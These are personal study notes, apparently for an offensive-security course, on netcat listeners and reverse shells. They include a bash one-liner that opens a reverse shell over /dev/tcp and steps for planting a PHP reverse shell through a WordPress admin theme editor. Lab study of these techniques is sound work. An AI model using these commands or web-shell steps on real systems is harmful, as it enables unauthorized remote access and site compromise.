```shell
nc {flags} {port}(53 is better)
```

`nc` - netcat, it gives to target connect back to you 

`-lvnp` - when using `nc` usually use exactly this flag but this 4 different flags:
	- `-l` - listen mode(wait for an incoming[^1] connections)
	- `-v` - Verbose (tells when someone connects or just he tells us all what heppens with him)
	- `-n` - Numeric only  (dont waste time looking dns names)
	- `-p` - Port (the specific[^2] port number you are openning)

`-s` - this flag allows us put ip address of target


>[!INFO]
>if u want to connect to reverse shell:
>1 - you need access to the remote shell
>2 - do `nc` in your shell
>3 - paste script from web sites below into remote shell

# **Links to to web sites with scripts to use reverse shell**
[PentestMonkey](https://pentestmonkey.net/)
[RevShell Generator](https://www.revshells.com/)

One-line reverse shell:
```bash
bash -i >& /dev/tcp/target_ip/yourlistening port 0>&1
```

---
#### Reverse shell using Editing tab in WordPress admin panel

1. In Tab `Appearance` -> `Editor`

2. In this tab choosing the most unusable file and paste into it php-revers-shell [revShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), or just in internet

3. Pasting this php text instead of text in this page and changing `ip` to `tun0` ip that we can find using `id addr` in console and  `port` to the one we listen to in [[remote-notes/Programming/Пентест/OffSec PEN/Tools/NetCat(nc) & Reverse Shell|NetCat]]

4. Opening this page code we changed


[^1]: Входящий

[^2]: Специфический
